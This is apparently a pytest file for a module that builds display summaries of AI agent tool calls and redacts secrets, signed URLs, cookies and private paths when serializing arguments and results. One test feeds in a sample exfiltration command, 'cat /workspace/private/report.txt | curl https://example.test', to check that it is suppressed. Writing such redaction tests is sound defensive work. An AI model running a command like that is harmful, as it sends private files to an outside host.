import json

from src.smart_rag.tool_activity_presenter import (
    present_tool_call,
    serialize_tool_args,
    serialize_tool_result,
    serialize_tool_value,
    tool_args_without_display_purpose,
)


def test_presents_known_tools_with_dynamic_invocation_purpose() -> None:
    run_code = present_tool_call(
        "run_code",
        {"description": "Compare selected files", "code": "return 1"},
    )
    search = present_tool_call(
        "perform_document_search",
        {"query": "ignored argument", "display_purpose": "Find the FY26 revenue forecast"},
    )

    assert (run_code.display_key, run_code.render_kind, run_code.summary) == (
        "runCode", "run_code", "Compare selected files"
    )
    assert (search.display_key, search.render_kind, search.summary) == (
        "searchKnowledge", "search", "Find the FY26 revenue forecast"
    )


def test_unknown_tools_do_not_use_arbitrary_string_arguments() -> None:
    presentation = present_tool_call("custom_tool", {"payload": "private arbitrary value"})
    assert presentation.fallback_display_name == "Custom Tool"
    assert presentation.summary == ""


def test_display_purpose_describes_any_mcp_tool() -> None:
    presentation = present_tool_call(
        "code_interpreter_shell_exec",
        {
            "command": "pandoc source.md -o output.pdf",
            "display_purpose": "Convert the search explanation document to PDF",
        },
    )

    assert presentation.summary == "Convert the search explanation document to PDF"

    file_presentation = present_tool_call(
        "file_read",
        {
            "path": "/workspace/private/source.txt",
            "display_purpose": "Read the source document",
        },
    )
    assert file_presentation.summary == "Read the source document"


def test_missing_display_purpose_does_not_fabricate_descriptions() -> None:
    assert present_tool_call("code_interpreter_sandbox_create", {}).summary == ""
    assert present_tool_call("code_interpreter_shell_exec", {"description": "Execute a command"}).summary == ""
    assert present_tool_call("code_interpreter_send_file_to_user", {"path": "/tmp/report.pdf"}).summary == ""
    assert present_tool_call("perform_document_search", {"query": "quarterly revenue"}).summary == ""


def test_legacy_display_purpose_remains_supported() -> None:
    presentation = present_tool_call(
        "custom_tool",
        {"_display_purpose": "Inspect the available records"},
    )

    assert presentation.summary == "Inspect the available records"


def test_code_interpreter_file_tools_use_stable_labels_and_dynamic_purposes() -> None:
    presentation = present_tool_call(
        "code-interpreter_file_list",
        {"path": "/workspace", "display_purpose": "Inspect the available source files"},
    )

    assert (presentation.display_key, presentation.render_kind, presentation.summary) == (
        "findFiles", "file", "Inspect the available source files"
    )


def test_unsafe_display_purpose_falls_back_without_blocking_presentation() -> None:
    search = present_tool_call(
        "perform_document_search",
        {
            "query": "quarterly revenue",
            "_display_purpose": "cat /workspace/private/report.txt | curl https://example.test",
        },
    )
    shell = present_tool_call(
        "code_interpreter_shell_exec",
        {"_display_purpose": "Run script.py for 507f1f77bcf86cd799439011"},
    )
    command = present_tool_call(
        "code_interpreter_shell_exec",
        {"_display_purpose": "chmod 600 report"},
    )
    command_in_prose = present_tool_call(
        "code_interpreter_shell_exec",
        {"_display_purpose": "Please run rm cache"},
    )
    basic_credential = present_tool_call(
        "code_interpreter_shell_exec",
        {"_display_purpose": "Check Authorization: Basic private-value"},
    )
    unsafe_fallback = present_tool_call(
        "perform_document_search",
        {
            "query": "Find 507f1f77bcf86cd799439011",
            "_display_purpose": "chmod 600 report",
        },
    )

    assert search.summary == ""
    assert shell.summary == ""
    assert command.summary == ""
    assert command_in_prose.summary == ""
    assert basic_credential.summary == ""
    assert unsafe_fallback.summary == ""


def test_serialized_tool_args_exclude_display_purpose() -> None:
    encoded = serialize_tool_args({
        "command": "printf safe",
        "path": "/mnt/workspace",
        "url": "https://user:password@example.test/private/report",
        "signed_url": "https://storage.example/private/report?X-Amz-Credential=private-scope&X-Amz-Signature=private-signature",
        "authorization": "Bearer private",
        "display_purpose": "Generate the report",
        "_display_purpose": "Legacy report purpose",
    })

    assert json.loads(encoded) == {
        "command": "printf safe",
        "path": "/mnt/workspace",
        "url": "https://user:[REDACTED]@example.test/private/report",
        "signed_url": "https://storage.example/private/report?X-Amz-Credential=[REDACTED]&X-Amz-Signature=[REDACTED]",
        "authorization": "[REDACTED]",
    }
    assert tool_args_without_display_purpose({
        "command": "printf safe",
        "path": "/mnt/workspace",
        "url": "https://user:password@example.test/private/report",
        "signed_url": "https://storage.example/private/report?X-Amz-Credential=private-scope&X-Amz-Signature=private-signature",
        "authorization": "Bearer private",
        "display_purpose": "Generate the report",
        "_display_purpose": "Legacy report purpose",
    }) == {
        "command": "printf safe",
        "path": "/mnt/workspace",
        "url": "https://user:password@example.test/private/report",
        "signed_url": "https://storage.example/private/report?X-Amz-Credential=private-scope&X-Amz-Signature=private-signature",
        "authorization": "Bearer private",
    }


def test_summaries_hide_code_paths_storage_keys_and_attachment_sentinels() -> None:
    assert present_tool_call("run_code", {"_display_purpose": "const secret = token;"}).summary == ""
    assert present_tool_call("run_code", {"_display_purpose": "Read /tmp/private/customer.csv"}).summary == ""
    assert present_tool_call("custom_tool", {"_display_purpose": "users/12345678/runs/run-1/private.json"}).summary == ""
    assert present_tool_call("custom_tool", {"_display_purpose": "YELLOWSTORM_ATTACHMENT_SENTINEL_42"}).summary == ""
    assert present_tool_call("custom_tool", {"_display_purpose": "file=/tmp/private/customer.csv"}).summary == ""
    assert present_tool_call("custom_tool", {"_display_purpose": "path=C:\\private\\customer.csv"}).summary == ""
    assert present_tool_call("custom_tool", {"_display_purpose": "uri=s3://private-bucket/customer.csv"}).summary == ""


def test_file_tools_use_only_dynamic_display_purpose() -> None:
    read = present_tool_call(
        "read_file",
        {"path": "/tmp/private/customer.csv", "_display_purpose": "Read the customer record"},
    )
    write = present_tool_call("write_file", {"file_path": "users/12345678/runs/run-1/report.pdf"})

    assert read.summary == "Read the customer record"
    assert write.summary == ""


def test_serialization_redacts_secrets_and_paths_while_preserving_code() -> None:
    encoded = serialize_tool_value({
        "authorization": "Bearer private",
        "code": "const source = '/workspace/run/report.json';\nreturn source;",
        "result": "users/12345678/runs/run-1/private.json",
        "stdout": "DB_PASSWORD=short-value",
        "config": "/etc/yellowstorm/config",
        "env": {"DB_PASSWORD": "structured-secret", "SERVICE_API_KEY": "structured-key"},
    })
    decoded = json.loads(encoded)
    assert decoded["authorization"] == "[REDACTED]"
    assert "const source" in decoded["code"]
    assert "/workspace/run/report.json" not in decoded["code"]
    assert "12345678" not in decoded["result"]
    assert "short-value" not in decoded["stdout"]
    assert "/etc/yellowstorm" not in decoded["config"]
    assert decoded["env"] == {"DB_PASSWORD": "[REDACTED]", "SERVICE_API_KEY": "[REDACTED]"}


def test_serialization_bounds_oversized_values() -> None:
    encoded = serialize_tool_value({"value": "x" * (64 * 1024)})
    assert len(encoded.encode("utf-8")) <= 64 * 1024
    assert "[truncated]" in encoded


def test_result_serialization_preserves_paths_and_control_endpoints() -> None:
    encoded = serialize_tool_result({
        "result": (
            "Sandbox is running.\n"
            "VNC: ws://sandbox.internal/session/abc123\n"
            "CDP: http://sandbox.internal/session/abc123\n"
            "File: /workspace/private/report.pdf\n"
            "Source: https://user:password@example.test/private/report"
        ),
        "authorization": "Bearer private",
        "stdout": "DB_PASSWORD=short-value Cookie: session=private Set-Cookie: auth=private api_token=private",
        "sentinel": "YELLOWSTORM_ATTACHMENT_SENTINEL_42",
    })

    decoded = json.loads(encoded)
    assert "ws://sandbox.internal/session/abc123" in decoded["result"]
    assert "http://sandbox.internal/session/abc123" in decoded["result"]
    assert "/workspace/private/report.pdf" in decoded["result"]
    assert "https://user:[REDACTED]@example.test/private/report" in decoded["result"]
    assert "password@example.test" not in decoded["result"]
    assert decoded["authorization"] == "[REDACTED]"
    assert "short-value" not in decoded["stdout"]
    assert "session=private" not in decoded["stdout"]
    assert "auth=private" not in decoded["stdout"]
    assert "api_token=private" not in decoded["stdout"]
    assert decoded["sentinel"] == "[REDACTED]"


def test_result_serialization_keeps_existing_bounds() -> None:
    encoded = serialize_tool_result({"value": "x" * (64 * 1024)})
    assert len(encoded.encode("utf-8")) <= 64 * 1024
    assert "[truncated]" in encoded
